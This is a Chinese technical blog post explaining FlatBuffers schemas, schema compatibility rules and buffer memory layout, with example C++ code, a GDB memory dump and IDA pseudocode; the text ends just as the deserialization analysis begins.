            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Flatbuffers 简介</strong></p>
<p>FlatBuffers 是一个开源的、跨平台的、高效的、提供了多种语言接口的序列化工具库，实现了与 Protocal Buffers 类似的序列化格式</p>
<p>FlatBuffers 通过 Scheme 文件定义数据结构，在官方网站 <a target="_blank" rel="noopener" href="https://flatbuffers.dev/flatbuffers_guide_tutorial.html">FlatBuffers: Tutorial</a> 中可以找到如下的测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> MyGame.Sample;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Color</span>:</span>byte &#123; Red = <span class="number">0</span>, Green, Blue = <span class="number">2</span> &#125;</span><br><span class="line"><span class="keyword">union</span> Equipment &#123; Weapon &#125; <span class="comment">// Optionally add more tables.</span></span><br><span class="line"> </span><br><span class="line">struct Vec3 &#123;</span><br><span class="line">  x:<span class="keyword">float</span>;</span><br><span class="line">  y:<span class="keyword">float</span>;</span><br><span class="line">  z:<span class="keyword">float</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">table Monster &#123;</span><br><span class="line">  pos:Vec3; <span class="comment">// Struct.</span></span><br><span class="line">  mana:<span class="keyword">short</span> = <span class="number">150</span>;</span><br><span class="line">  hp:<span class="keyword">short</span> = <span class="number">100</span>;</span><br><span class="line">  name:<span class="built_in">string</span>;</span><br><span class="line">  friendly:<span class="keyword">bool</span> = <span class="literal">false</span> (deprecated);</span><br><span class="line">  inventory:[ubyte];  <span class="comment">// Vector of scalars.</span></span><br><span class="line">  color:Color = Blue; <span class="comment">// Enum.</span></span><br><span class="line">  weapons:[Weapon];   <span class="comment">// Vector of tables.</span></span><br><span class="line">  equipped:Equipment; <span class="comment">// Union.</span></span><br><span class="line">  path:[Vec3];        <span class="comment">// Vector of structs.</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">table Weapon &#123;</span><br><span class="line">  name:<span class="built_in">string</span>;</span><br><span class="line">  damage:<span class="keyword">short</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure>
<ul>
<li>Table：每个字段都有一个名称，一个类型和一个可选的默认值（默认为 0 / NULL）</li>
<li>Structs：只包含标量或其他结构（没有默认值，其字段也不会被添加或者弃用）</li>
<li>Types：包括标量类型和非标量类型<ul>
<li>标量类型的字段有默认值</li>
<li>非标量的字段 <code>(string/vector/table/enums/structs)</code> 如果没有值的话，默认值为 NULL </li>
</ul>
</li>
<li>Enums：定义一系列命名常量，默认的第一个值是 “0” </li>
<li>Unions：一个 Unions 中可以放置多种类型，共同使用一个内存区域<ul>
<li>可以声明一个 Unions 字段，该字段可以包含对这些类型中的任何一个的引用，即这块内存区域只能由其中一种类型使用</li>
<li>另外还会生成一个带有后缀 <code>_type</code> 的隐藏字段，该字段包含相应的枚举值，从而可以在运行时知道要将哪些类型转换为类型</li>
</ul>
</li>
<li>Root Type：声明了序列化数据的根表 </li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://halfrost.com/flatbuffers_schema/">深入浅出 FlatBuffers 之 Schema (halfrost.com)</a> </p>
<p><strong>Flatbuffers Table</strong></p>
<p>Table 中每个字段都是可选 optional 的，这种机制可以令 Flatbuffers 前向和后向兼容</p>
<p>假设当前 schema 如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:<span class="keyword">int</span>; b:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>在后添加字段： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:<span class="keyword">int</span>; b:<span class="keyword">int</span>; c:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>旧的 schema 读取新的数据结构会忽略新字段 c 的存在（不会浪费存储空间），新的 schema 读取旧的数据，将会取到 c 的默认值 </li>
</ul>
<p>在前添加字段： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; c:<span class="keyword">int</span> a:<span class="keyword">int</span>; b:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在前面添加新字段是不允许的，因为这会使 schema 新旧版本不兼容 </li>
</ul>
<p>指定字段 ID 序列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; c:<span class="keyword">int</span> (id: <span class="number">2</span>); a:<span class="keyword">int</span> (id: <span class="number">0</span>); b:<span class="keyword">int</span> (id: <span class="number">1</span>); &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以手动指定 ID 排序/分组，只要顺序与旧版本相同也是可以兼容的</li>
</ul>
<p>删除字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:<span class="keyword">int</span> (deprecated); b:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>不能直接从 schema 中删除字段（否则会破坏源代码），可以将需要删除的字段标记为 deprecated</li>
<li>旧的 schema 读取新的数据结构会获得 a 的默认值（因为它不存在）</li>
<li>新的 schema 代码不能读取也不能写入 a，它们将忽略该字段</li>
</ul>
<p>更改字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:uint; b:uint; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果旧数据不包含任何负数，这将是安全的，如果包含了负数，这样改变会出现问题 </li>
<li>不能修改字段名称与字段默认值（否则会破坏所有使用此版本 schema 的代码）</li>
</ul>
<p><strong>Flatbuffers Structs</strong></p>
<p>Structs 只包含标量或其他结构，只要确定以后就不会进行任何更改 </p>
<p>Structs 使用的内存少于 Table，并且访问速度更快，它们总是以串联方式存储在其父对象中，并且不使用虚表</p>
<p>Structs 不提供前向/后向兼容性，占用内存更小 </p>
<p><strong>Flatbuffers 内存布局</strong></p>
<p>测试样例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> Test.Sample;</span><br><span class="line"> </span><br><span class="line">table Monster &#123;</span><br><span class="line">  name:<span class="built_in">string</span>;</span><br><span class="line">  weapon:[Weapon];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table Weapon &#123;</span><br><span class="line">  key:<span class="built_in">string</span>;</span><br><span class="line">  value:<span class="keyword">int</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;flatbuffers.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test_generated.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> <span class="comment">// C++ header file for printing</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span> <span class="comment">// C++ header file for file access</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> Test::Sample;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">flatbuffers::FlatBufferBuilder <span class="title">builder</span><span class="params">(<span class="number">1024</span>)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> name = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key1 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;aaaaaaaa&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key2 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;bbbbbbbb&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key3 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;cccccccc&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key4 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;dddddddd&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> value1 = <span class="number">0x31</span>;</span><br><span class="line">    <span class="keyword">auto</span> value2 = <span class="number">0x32</span>;</span><br><span class="line">    <span class="keyword">auto</span> value3 = <span class="number">0x33</span>;</span><br><span class="line">    <span class="keyword">auto</span> value4 = <span class="number">0x34</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> weapon1 = <span class="built_in">CreateWeapon</span>(builder,key1,value1);</span><br><span class="line">    <span class="keyword">auto</span> weapon2 = <span class="built_in">CreateWeapon</span>(builder,key2,value2);</span><br><span class="line">    <span class="keyword">auto</span> weapon3 = <span class="built_in">CreateWeapon</span>(builder,key3,value3);</span><br><span class="line">    <span class="keyword">auto</span> weapon4 = <span class="built_in">CreateWeapon</span>(builder,key4,value4);</span><br><span class="line">    std::vector&lt;flatbuffers::Offset&lt;Weapon&gt;&gt; weapons_vector;</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon1);</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon2);</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon3);</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> weapons = builder.<span class="built_in">CreateVector</span>(weapons_vector);</span><br><span class="line">    <span class="keyword">auto</span> monster = <span class="built_in">CreateMonster</span>(builder,name,weapons);</span><br><span class="line"></span><br><span class="line">    builder.<span class="built_in">Finish</span>(monster);</span><br><span class="line">    <span class="keyword">uint8_t</span> *buf = builder.<span class="built_in">GetBufferPointer</span>();</span><br><span class="line">    <span class="keyword">auto</span> size = builder.<span class="built_in">GetSize</span>();</span><br><span class="line">    <span class="function">flatbuffers::Verifier <span class="title">verifier</span><span class="params">(buf, size)</span></span>;</span><br><span class="line">    <span class="keyword">bool</span> ok = verifier.VerifyBuffer&lt;Monster&gt;(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (ok)&#123;</span><br><span class="line">        <span class="keyword">auto</span> monster_bk = <span class="built_in">GetMonster</span>(buf);</span><br><span class="line">        <span class="keyword">auto</span> name_bk = monster_bk-&gt;<span class="built_in">name</span>()-&gt;<span class="built_in">c_str</span>();</span><br><span class="line">        <span class="keyword">auto</span> weapons_bk = monster_bk-&gt;<span class="built_in">weapon</span>();</span><br><span class="line">        <span class="keyword">auto</span> key1_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">0</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> key2_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">1</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> key3_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">2</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> key4_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">3</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> value1_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">0</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">        <span class="keyword">auto</span> value2_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">1</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">        <span class="keyword">auto</span> value3_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">2</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">        <span class="keyword">auto</span> value4_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">3</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>CreateMonster</code> 处打断点，然后 GDB 调试打印数据如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5555555702b0</span> ◂— <span class="number">0x9c00000060</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5555555702b8</span> ◂— <span class="number">0xa000000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5555555702c0</span> ◂— <span class="number">0x4</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">6</span>c:<span class="number">0360</span>│  <span class="number">0x555555570600</span> ◂— <span class="number">0xc000800000000</span></span><br><span class="line"><span class="number">6</span>d:<span class="number">0368</span>│  <span class="number">0x555555570608</span> ◂— <span class="number">0xffffffbc00080004</span></span><br><span class="line"><span class="number">6</span>e:<span class="number">0370</span>│  <span class="number">0x555555570610</span> ◂— <span class="number">0x400000094</span></span><br><span class="line"><span class="number">6f</span>:<span class="number">0378</span>│  <span class="number">0x555555570618</span> ◂— <span class="number">0x3c00000004</span></span><br><span class="line"><span class="number">70</span>:<span class="number">0380</span>│  <span class="number">0x555555570620</span> ◂— <span class="number">0x1400000024</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line"><span class="number">71</span>:<span class="number">0388</span>│  <span class="number">0x555555570628</span> ◂— <span class="number">0xffffffdc00000004</span></span><br><span class="line"><span class="number">72</span>:<span class="number">0390</span>│  <span class="number">0x555555570630</span> ◂— <span class="number">0x3400000034</span> <span class="comment">/* &#x27;4&#x27; */</span></span><br><span class="line"><span class="number">73</span>:<span class="number">0398</span>│  <span class="number">0x555555570638</span> ◂— <span class="number">0x38ffffffe8</span></span><br><span class="line"><span class="number">74</span>:<span class="number">03</span>a0│  <span class="number">0x555555570640</span> ◂— <span class="number">0xfffffff400000033</span> <span class="comment">/* &#x27;3&#x27; */</span></span><br><span class="line"><span class="number">75</span>:<span class="number">03</span>a8│  <span class="number">0x555555570648</span> ◂— <span class="number">0x320000003c</span> <span class="comment">/* &#x27;&lt;&#x27; */</span></span><br><span class="line"><span class="number">76</span>:<span class="number">03b</span>0│  <span class="number">0x555555570650</span> ◂— <span class="number">0x80004000c0008</span></span><br><span class="line"><span class="number">77</span>:<span class="number">03b</span>8│  <span class="number">0x555555570658</span> ◂— <span class="number">0x3800000008</span></span><br><span class="line"><span class="number">78</span>:<span class="number">03</span>c0│  <span class="number">0x555555570660</span> ◂— <span class="number">0x800000031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">79</span>:<span class="number">03</span>c8│  <span class="number">0x555555570668</span> ◂— <span class="string">&#x27;dddddddd&#x27;</span></span><br><span class="line"><span class="number">7</span>a:<span class="number">03</span>d0│  <span class="number">0x555555570670</span> ◂— <span class="number">0x800000000</span></span><br><span class="line"><span class="number">7b</span>:<span class="number">03</span>d8│  <span class="number">0x555555570678</span> ◂— <span class="string">&#x27;cccccccc&#x27;</span></span><br><span class="line"><span class="number">7</span>c:<span class="number">03e0</span>│  <span class="number">0x555555570680</span> ◂— <span class="number">0x800000000</span></span><br><span class="line"><span class="number">7</span>d:<span class="number">03e8</span>│  <span class="number">0x555555570688</span> ◂— <span class="string">&#x27;bbbbbbbb&#x27;</span></span><br><span class="line"><span class="number">7</span>e:<span class="number">03f</span>0│  <span class="number">0x555555570690</span> ◂— <span class="number">0x800000000</span></span><br><span class="line"><span class="number">7f</span>:<span class="number">03f</span>8│  <span class="number">0x555555570698</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"><span class="number">80</span>:<span class="number">0400</span>│     <span class="number">0x5555555706a0</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">81</span>:<span class="number">0408</span>│     <span class="number">0x5555555706a8</span> ◂— <span class="number">0x656d616e</span> <span class="comment">/* &#x27;name&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>首先在 Flatbuffers 的缓冲区中，数据是倒序排列的</li>
<li>从下往上看：在字符串之后，有4字节的 <code>\x00</code> 用于分割 data 和 size，又有4字节的空间用于指示字符串的大小</li>
<li>位于缓冲区最上方的控制信息是实时更新的</li>
</ul>
<p><strong>Flatbuffers 逆向分析</strong></p>
<p>下面先展示一个 IDA 逆向分析出来的伪代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">v3 = flatbuffers::AlignOf&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span>&gt;();</span><br><span class="line">flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::<span class="built_in">FlatBufferBuilderImpl</span>(&amp;builder, <span class="number">0x400</span>uLL, <span class="number">0LL</span>, <span class="number">0</span>, v3);</span><br><span class="line">name.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;name&quot;</span>).o;</span><br><span class="line">key1.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;aaaaaaaa&quot;</span>).o;</span><br><span class="line">key2.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;bbbbbbbb&quot;</span>).o;</span><br><span class="line">key3.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;cccccccc&quot;</span>).o;</span><br><span class="line">key4.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;dddddddd&quot;</span>).o;</span><br><span class="line">value1 = <span class="number">49</span>;</span><br><span class="line">value2 = <span class="number">50</span>;</span><br><span class="line">value3 = <span class="number">51</span>;</span><br><span class="line">value4 = <span class="number">52</span>;</span><br><span class="line">weapon1.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key1, <span class="number">49</span>).o;</span><br><span class="line">weapon2.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key2, <span class="number">50</span>).o;</span><br><span class="line">weapon3.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key3, <span class="number">51</span>).o;</span><br><span class="line">weapon4.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key4, <span class="number">52</span>).o;</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">vector</span>(&amp;weapons_vector);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon1);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon2);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon3);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon4);</span><br><span class="line">weapons.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateVector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,std::allocator&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;&gt;(</span><br><span class="line">              &amp;builder,</span><br><span class="line">              &amp;weapons_vector).o;</span><br><span class="line">monster.o = Test::Sample::<span class="built_in">CreateMonster</span>(&amp;builder, name, weapons).o;</span><br><span class="line">flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::Finish&lt;Test::Sample::Monster&gt;(&amp;builder, monster, <span class="number">0LL</span>);</span><br><span class="line">buf = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::<span class="built_in">GetBufferPointer</span>(&amp;builder);</span><br><span class="line">size = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::<span class="built_in">GetSize</span>(&amp;builder);</span><br><span class="line">flatbuffers::Verifier::<span class="built_in">Verifier</span>(&amp;verifier, buf, size, <span class="number">0x40</span>u, <span class="number">0xF4240</span>u, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ( flatbuffers::Verifier::VerifyBuffer&lt;Test::Sample::Monster&gt;(&amp;verifier, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  monster_bk = Test::Sample::<span class="built_in">GetMonster</span>(buf);</span><br><span class="line">  v4 = Test::Sample::Monster::<span class="built_in">name</span>(monster_bk);</span><br><span class="line">  name_bk = flatbuffers::String::<span class="built_in">c_str</span>(v4);</span><br><span class="line">  weapons_bk = Test::Sample::Monster::<span class="built_in">weapon</span>(monster_bk);</span><br><span class="line">  v5 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">0</span>);</span><br><span class="line">  v6 = Test::Sample::Weapon::<span class="built_in">key</span>(v5);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key1_bk, v6);</span><br><span class="line">  v7 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">1u</span>);</span><br><span class="line">  v8 = Test::Sample::Weapon::<span class="built_in">key</span>(v7);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key2_bk, v8);</span><br><span class="line">  v9 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">2u</span>);</span><br><span class="line">  v10 = Test::Sample::Weapon::<span class="built_in">key</span>(v9);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key3_bk, v10);</span><br><span class="line">  v11 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">3u</span>);</span><br><span class="line">  v12 = Test::Sample::Weapon::<span class="built_in">key</span>(v11);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key4_bk, v12);</span><br><span class="line">  v13 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">0</span>);</span><br><span class="line">  value1_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v13);</span><br><span class="line">  v14 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">1u</span>);</span><br><span class="line">  value2_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v14);</span><br><span class="line">  v15 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">2u</span>);</span><br><span class="line">  value3_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v15);</span><br><span class="line">  v16 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">3u</span>);</span><br><span class="line">  value4_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v16);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key4_bk);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key3_bk);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key2_bk);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key1_bk);</span><br><span class="line">&#125;</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::~<span class="built_in">vector</span>(&amp;weapons_vector);</span><br><span class="line">flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::~<span class="built_in">FlatBufferBuilderImpl</span>(&amp;builder);</span><br></pre></td></tr></table></figure>
<p>这里我们重点分析反序列化的部分：</p>
